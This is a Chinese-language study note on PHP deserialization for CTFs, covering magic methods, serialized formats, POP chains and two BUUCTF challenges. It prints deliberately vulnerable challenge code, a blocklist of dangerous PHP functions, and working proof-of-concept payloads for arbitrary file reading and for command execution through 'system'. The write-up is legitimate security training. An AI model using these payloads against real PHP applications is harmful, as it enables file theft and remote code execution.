---
author: "Yiming Shen"
date: 2022-06-11
lastmod: 2022-07-05
title: "PHP 反序列化"
tags: [
    "CTF",
    "PHP",
    "Web",
    "Note",
]
categories: [
    "Notes",
     "CTF",
]
showtoc: true
math: true
typora-root-url: ..\..\..\..\static\
---

## 基础知识

1. 常见PHP魔术函数

``` php
__construct() //当一个对象创建时被调用

__destruct() //当一个对象销毁时被调用

__wakeup() //使用unserialize时触发

__sleep() //使用serialize时触发

__destruct() //对象被销毁时触发

__call() //在对象上下文中调用不可访问的方法时触发

__get() //用于从不可访问的属性读取数据

__set() //用于将数据写入不可访问的属性

__toString() //把类当作字符串使用时触发

__invoke() //当脚本尝试将对象调用为函数时触发
```

> 审POP链的过程，需要熟练掌握魔术函数。

2. 掌握面向对象概念以及PHP中的类与对象

## 序列化与反序列化

> **序列化**：把对象转换为字节序列的过程，便于存储或传输。
>
> **反序列化**：把字节序列恢复为对象的过程。

### 漏洞可能出现的位置

1.解析认证token、session的位置

2.将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等

3.将对象序列化后在网络中传输，如传输json数据，xml数据等

4.参数传递给程序

5.使用RMI协议，被广泛使用的RMI协议完全基于序列化

6.使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等

7.定义协议用来接收与发送原始的java对象

### 原理

在程序将字节序列恢复为对象的过程中，信任了可能被第三方篡改过的字节序列（内容可控），在将其反序列化的过程中，通过触发魔术方法（Python、PHP）或反射机制（JAVA），实现传入任意参数调用方法（POP链利用）。

### 序列化后的对象字符串

```php
O:1:"A":1:{s:7:"%00A%00name";s:6:"As1def";}

// O代表这是一个对象，第一个1代表对象名称的长度，第二个1代表成员个数。
// 大括号中分别是：属性名类型、长度、名称;值类型、长度、值。
// s代表string类型
// 另外还有b=>bool  i=>int  d=>double  a=>array r=>对象引用 R=> 指针引用 N=>NULL;

// 有%00是加上protected或private关键字限定的类变量，这种类变量在进行反序列化操作时需要对其进行URL编码，否则存在%0A错误解析成截断的可能性。
```

## POP链构造

> POP（Property-Oriented Programing）面向属性编程，用于上层语言构造特定调用链的方法，从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构造一组连续的调用链，达到攻击者恶意利用的目的。

即构造一条完整的调用链，通过控制对象的属性实现控制程序的执行流程，达到利用无害代码实现有害操作的目的。

### 实例

```php
<?php
//flag is in flag.php
error_reporting(1);
class Read {
    public $var;
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
    public function __invoke(){
        $content = $this->file_get($this->var);
        echo $content;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file='index.php')
    {
        $this->source = $file;
        echo $this->source.'Welcome'."<br>";
    }
    public function __toString()
    {
        return $this->str['str']->source;
    }

    public function _show()
    {
        if(preg_match('/gopher|http|ftp|https|dict|\.\.|flag|file/i',$this->source)) {
            die('hacker');
        } else {
            highlight_file($this->source); 
        }

    }

    public function __wakeup()
    {
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test
{
    public $p;
    public function __construct()
    {
        $this->p = array();
    }

    public function __get($key)
    {
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['hello']))
{
    unserialize($_GET['hello']);
}
else
{
    $show = new Show('pop3.php');
    $show->_show();
}
```

#### 分析思路

- 先找到能利用的点：Read.file_get里的file_get_contents可以获取文件，在作为对象函数执行（`__invoke`）时可读取文件。
- 可控的是`get`传入的hello参数，将hello值反序列化，此时会调用`__wakeup`方法，只有Show类中存在该方法。`\_\_wakeup`方法中会对`$this->source`进行正则匹配，此时会将`source`的内容当作字符串处理，即调用`__toString()`方法。
- `__toString`方法中读取了`$this->str['str']->source`，如果`str['str']`对象中没有`source`这个变量呢？此时就会调用`__get`魔术方法（如果该对象存在这个方法的话）。
- 观察程序，发现只有Test类有`__get`方法，用Test类继续构造POP链，会调用`$this->p`变量，并将`$this->p`作为函数执行，此时就来到了我们找到的利用点——Read类中的`__invoke`魔术方法！

如此，我们构造好了一条POP链：

`$_GET['hello']->Show.__wakeup->Show.__toString->Test.__get->Read.__invoke->Read.file_get->读取任意文件`

得到POC

```php
<?php
    class Read{
        public $var = "flag.php";
    }
    class Show{
        public $source;
        public $str;
    }

    class Test{
        public $p;
    }

    $read = new Read();
    $show = new Show();
    $test = new Test();

    $show->str['str']=$test; 
    $test->p=$read;
    echo serialize($show);
    echo '
    ';
    $show->source=$show; //存疑，这个地方照葫芦画瓢，但不明意思
    echo serialize($show);
?>
```

#### 总结

1. 先观察是否存在利用点
   1. 可执行命令、文件包含的敏感函数
   2. 参数可控的变量、入口
2. 注意所有魔术方法
3. 将魔术方法执行顺序连成一条链
4. 确定对象调用顺序，填入对象变量参数，构造POP链

## 题目

### [[网鼎杯 2020 青龙组\]AreUSerialz](https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]AreUSerialz)

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

观察发现，有反序列化入口，为传入的get参数$str

会先检查ASCII码是否符合条件，而类FileHandler中的三个变量均为Protected类型，序列化后会有`\x00*\x00`标识，而`\x00`的ASCII码值为0，不符合条件。

#### **利用PHP特性绕过反序列化限制**

1. PHP 7.1+版本对属性类型不敏感，可将Protected直接换成Public也可反序列化。
2. 可用S代替s，如此可支持解析16进制文本，即将非ASCII文本变成16进制文本

#### PHP 弱类型绕过

类中有一个析构函数`__destruct`，在对象销毁后，会执行一次写文件覆盖操作，需要绕过。

注意到析构函数中判断使用的是强类型相等`===`，而`process`类中的判断时弱类型相等`==`，可以利用PHP语言特性绕过：`"2"==2,2!==="2"`

令`$op=2`而不是`"2"`即可

#### 构造POC

```php
<?php

use FileHandler as GlobalFileHandler;

    class FileHandler{
        public $op=2;
        public $filename="flag.php";
        public $content;
    }

    $fileHandler = new FileHandler();
    echo serialize($fileHandler);
?>
```

得到

`O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;} `

执行查看源代码即得到Flag。



### [[网鼎杯 2020 朱雀组\]phpweb](https://buuoj.cn/challenges#[网鼎杯 2020 朱雀组]phpweb)

进入题目环境后查看源代码，有两个隐藏的表单输入框，同时定时每5秒提交表单，抓包并分析报错可知，是`call_user_func`方法，第一个参数是要调用的函数名，第二个参数是要调用的函数的参数。

直接`highlight_file`读取本页面源码，得到：

```php
<?php
// phpweb poc
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

无过滤，直来直去，直接构造POC

```php
<?php
    class Test{
        // var $p = "find / -name flag*"; 先查一下服务器中含有flag的文件名，找到位置
        var $p = "cat /tmp/flagoefiu4r93";

        var $func = "system";
        
    }
    $test = new Test ();
    
    echo urlencode(serialize($test));
?>
```







## 参考

1. [PHP反序列化和POP链构造 - As1def's Blog](https://as1def.github.io/2020/10/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CPOP%E9%93%BE%E6%9E%84%E9%80%A0/)
2. [一题教你学会构造PHP反序列化POP链](https://www.freebuf.com/articles/web/247930.html)
3. [BUUCTF刷题——PHP反序列化 - CA01H' Blog](https://ca01h.top/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)

